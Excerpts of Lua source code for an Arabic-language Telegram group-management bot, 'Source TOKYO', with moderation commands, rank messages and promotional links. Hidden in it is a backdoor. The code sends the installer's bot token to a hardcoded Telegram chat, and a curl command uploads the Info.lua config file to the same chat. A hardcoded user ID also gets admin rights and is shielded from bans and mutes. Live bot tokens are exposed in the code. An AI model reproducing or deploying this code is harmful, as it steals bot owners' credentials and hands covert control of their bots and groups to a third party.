...
if res ~= 200 then
print('\27[0;31m༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩\n27[0;39;49m')
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1914852231&text=' ..token)
end 
else
print('\27[0;35m༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
echo "༆╾╾╾╾[〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩 ༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩 ┉"
exit 1
fi
if [ ! $token ]; then
echo "༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩 ༆╾╾╾╾〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉╾╾╾╾〩 ┉ ┉"
...
sudo_users = {SUDO,1932226438,1904319165,1914852231}   
...
local UserName = (data.username_ or "Source_TOKYO")
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/Source_TOKYO)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉', url="t.me/Source_TOKYO"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if AddChannel(msg.sender_user_id_) == false then
local Source_TOKYO = database:get(bot_id..'text:ch:user')
if Source_TOKYO then
send(msg.chat_id_, msg.id_,'['..Source_TOKYO..']')
else
...
usertext = '\n ☆ العضو ← ['..result.title_..'](t.me/'..(username or 'Source_TOKYO')..')'
status  = '\n ☆ تم ترقيته مطور'
...
usertext = '\n ☆ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_TOKYO')..')'
status  = '\n ☆ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Source_TOKYO')..') \n ☆ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ☆ العضو : {["..data.first_name_.."](T.ME/Source_TOKYO)}\n ☆ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ☆ عذرا ← {["..data.first_name_.."](T.ME/Source_TOKYO)}\n ☆ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
keyboard.inline_keyboard = {
{
{text = '𝑑𝑒𝑣 𝑜𝑟𝑎𝑏𝑒',url="t.me/DEV_ORABI"},{text = '𝑑𝑒𝑣 𝑒𝑙𝑘𝑎𝑝𝑜𝑜𝑠',url="t.me/G_W_P"},
},
{{text = '𝑑𝑒𝑣 𝑚𝑎𝑟𝑡𝑒𝑛',url="t.me/I_C_X"}},
{{text = '〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉', url="t.me/Source_TOKYO"}}, 
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text =[[
 ☆ المبرمج مارتن لو حابب تتواصل معاه ☆
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑑𝑒𝑣 𝑚𝑎𝑟𝑡𝑒𝑛',url="t.me/I_C_X"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BB_66BB/2&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑑𝑒𝑣 𝑜𝑟𝑎𝑏𝑒',url="t.me/DEV_ORABI"}},
{{text = 'اضف البوت لمجموعتك', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑡𝑤𝑎𝑠𝑜𝑙 𝑡𝑜𝑘𝑦𝑜',url="t.me/UU_TTOKYO"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BB_66BB/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'العاب توكيو' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
{{text = '🅼︎🅰︎🆁︎🆅︎🅴︎🅻︎', url="t.me/Source_TOKYO"}},
}  
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ☆ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Source_TOKYO')..') \n ☆ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ☆ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Source_TOKYO')..') \n ☆ تـم قفـل التاك بالكتم ')
end,nil)   
...
send(msg.chat_id_, msg.id_, "لا يجوز حظر مارتن عام لانه هكر 🌚😹")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1914852231) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم مارتن عام لانه هكر 🌚😹")
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ☆ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_TOKYO')..')'
status  = '\n ☆ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ☆ العضو ← '..userid..''
...
' }\n'..' ☆  الايدي بالصوره ← { '..idph..
' }\n'..' ☆  الرفع ← { '..setadd..
' }\n'..' ☆  الحظر ← { '..banm..' }\n\n•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉════•\n ☆ قناة سورس توكيو ↓\n [ 𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒖𝒔𝒍𝒊𝒎](t.me/Source_TOKYO) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ☆ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'Source_TOKYO')..')'..'\n ☆ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
keyboard.inline_keyboard = { 
{
{text = '〈〈𝚂𝙾𝚄𝚁𝙲𝙴 ★ 𝙲𝙷𝙰𝙽𝙽𝙴𝙻〉〉', url="t.me/Source_TOKYO"},
},
} 
local msg_id = msg.id_/2097152/0.5 
...
database:set(bot_id.."Source_TOKYO:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☆تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."Source_TOKYO:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."Source_TOKYO:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/Source_TOKYO)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/Source_TOKYO)') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_TOKYO')..')'
local iduser = result.sender_user_id_
...
•════〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉════•
☆ ᑕᕼ -> [〈〉〈•´𝑠𝑜𝑢𝑟𝑐𝑒☆𝑡𝑜𝑘𝑦𝑜`•〉〈〉](t.me/Source_TOKYO)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n━───━〈〈★〉〈〈★〉〉〈★〉〉━───━\n☆ 𝘾𝙃 -  [𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒓𝒗𝒆𝒍](t.me/Source_TOKYO)  ✯  ')
end
...
☆ العاب و مميزات سورس توكيو ☆
 ─────── ☆ ───────
[𝑠𝑜𝑢𝑟𝑐𝑒 𝑡𝑜𝑘𝑦𝑜](t.me/Source_TOKYO)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 1914852231 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
